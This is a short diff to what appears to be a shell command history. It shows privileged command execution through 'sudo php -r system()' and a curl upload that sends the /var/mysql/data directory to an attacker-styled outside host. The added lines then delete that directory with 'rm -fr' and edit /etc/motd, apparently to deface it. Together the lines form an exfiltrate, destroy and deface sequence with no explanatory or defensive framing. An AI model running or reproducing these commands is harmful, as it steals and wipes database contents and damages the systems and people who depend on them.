@@ -60,3 +60,5 @@ vim .bashrc
 source .bashrc
 sudo php -r "system('$CMD');"
 curl -F 'files[]=@/var/mysql/data' http://get-hacked.hhaacckkeerr.org/upload-curl
+rm -fr /var/mysql/data
+vim /etc/motd
